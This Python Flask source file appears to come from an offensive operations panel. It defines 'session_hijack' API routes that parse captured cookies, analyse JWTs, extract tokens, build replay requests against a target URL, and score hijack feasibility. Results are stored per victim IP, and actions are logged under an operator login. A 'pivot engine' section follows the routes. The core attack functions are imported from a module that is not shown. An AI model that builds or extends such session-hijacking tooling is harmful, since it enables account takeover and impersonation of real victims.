"""session_hijack blueprint (P3 batch extract)."""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
import database as db

bp = Blueprint("session_hijack", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/api/session-hijack/features', methods=['GET'])
def api_hijack_features():
    from session_hijacker import get_supported_features
    return jsonify(get_supported_features())

@bp.route('/api/session-hijack/parse-cookies', methods=['POST'])
def api_hijack_cookies():
    from session_hijacker import parse_cookies
    data = request.get_json(force=True)
    cookie_string = data.get('cookie_string')
    cookie_list = data.get('cookie_list')
    result = parse_cookies(cookie_string, cookie_list)
    track_event('session_hijack')
    return jsonify(result)

@bp.route('/api/session-hijack/analyze-jwt', methods=['POST'])
def api_hijack_jwt():
    from session_hijacker import analyze_jwt
    data = request.get_json(force=True)
    token = data.get('token', '')
    result = analyze_jwt(token)
    track_event('session_hijack')
    return jsonify(result)

@bp.route('/api/session-hijack/extract-tokens', methods=['POST'])
def api_hijack_extract():
    from session_hijacker import extract_tokens
    data = request.get_json(force=True)
    result = extract_tokens(data)
    track_event('session_hijack')
    return jsonify(result)

@bp.route('/api/session-hijack/build-replay', methods=['POST'])
def api_hijack_replay():
    from session_hijacker import build_replay_request
    data = request.get_json(force=True)
    cookies = data.get('cookies', [])
    target_url = data.get('target_url', 'https://target.example.com')
    method = data.get('method', 'GET')
    result = build_replay_request(cookies, target_url, method)
    track_event('session_hijack')
    return jsonify(result)

@bp.route('/api/session-hijack/assess', methods=['POST'])
def api_hijack_assess():
    from session_hijacker import assess_session
    data = request.get_json(force=True)
    cookie_data = data.get('cookies', [])
    jwt_tokens = data.get('jwt_tokens')
    result = assess_session(cookie_data, jwt_tokens)
    track_event('session_hijack')
    # Save assessment
    db.save_session_hijack(
        victim_ip=data.get('victim_ip', 'unknown'),
        session_data=result,
        token_count=result.get('token_inventory', {}).get('total', 0),
        critical_tokens=result.get('token_inventory', {}).get('auth_tokens', 0),
        hijack_feasibility=result.get('hijack_feasibility', 'unknown'),
        risk_score=result.get('risk_score', 0))
    db.log_operator_action(session.get('IAm-logined', 'unknown'), 'session_assess',
                           f'Assessed session for {data.get("victim_ip", "unknown")}', request.remote_addr)
    return jsonify(result)

@bp.route('/api/session-hijack/history', methods=['GET'])
def api_hijack_history():
    victim_ip = request.args.get('victim_ip')
    records = db.get_session_hijacks(victim_ip)
    return jsonify({'records': records})

@bp.route('/api/session-hijack/<int:hijack_id>', methods=['DELETE'])
def api_hijack_delete(hijack_id):
    db.delete_session_hijack(hijack_id)
    return jsonify({'status': 'deleted'})


# ═══════════════════════════════════════════════════════════════
# PIVOT ENGINE API
# ═══════════════════════════════════════════════════════════════
